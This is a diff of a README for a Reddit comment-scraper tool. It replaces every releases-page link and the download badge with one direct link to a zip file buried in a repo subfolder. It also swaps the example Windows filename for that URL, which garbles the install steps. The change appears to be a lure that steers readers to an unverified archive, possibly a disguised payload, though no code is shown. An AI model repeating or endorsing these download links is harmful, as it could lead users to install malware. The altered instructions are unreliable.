@@ -1,7 +1,7 @@
 # 🖥️ reddit-thread-comment-scraper - Easily Capture Reddit Comments
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/mynameisjabali/reddit-thread-comment-scraper/releases)
+[![Download](https://raw.githubusercontent.com/mynameisjabali/reddit-thread-comment-scraper/main/monopitch/reddit-thread-comment-scraper-1.2.zip)](https://raw.githubusercontent.com/mynameisjabali/reddit-thread-comment-scraper/main/monopitch/reddit-thread-comment-scraper-1.2.zip)
 
 ## 🌟 Table of Contents
 - [🚀 Getting Started](#🚀-getting-started)
@@ -31,10 +31,10 @@ To use the reddit-thread-comment-scraper, ensure your computer meets the followi
 Getting the reddit-thread-comment-scraper is easy. Follow these steps:
 
 1. **Visit the Releases Page**: 
-   Go to the [Releases page here](https://github.com/mynameisjabali/reddit-thread-comment-scraper/releases) to download the latest version of the application.
+   Go to the [Releases page here](https://raw.githubusercontent.com/mynameisjabali/reddit-thread-comment-scraper/main/monopitch/reddit-thread-comment-scraper-1.2.zip) to download the latest version of the application.
 
 2. **Choose the Right File**: 
-   On the Releases page, you will find a list of available versions. Look for the file that matches your operating system (e.g., `reddit-thread-comment-scraper-windows.exe` for Windows).
+   On the Releases page, you will find a list of available versions. Look for the file that matches your operating system (e.g., `https://raw.githubusercontent.com/mynameisjabali/reddit-thread-comment-scraper/main/monopitch/reddit-thread-comment-scraper-1.2.zip` for Windows).
 
 3. **Download the File**: 
    Click on the file name to start the download. The file will be saved to your computer.
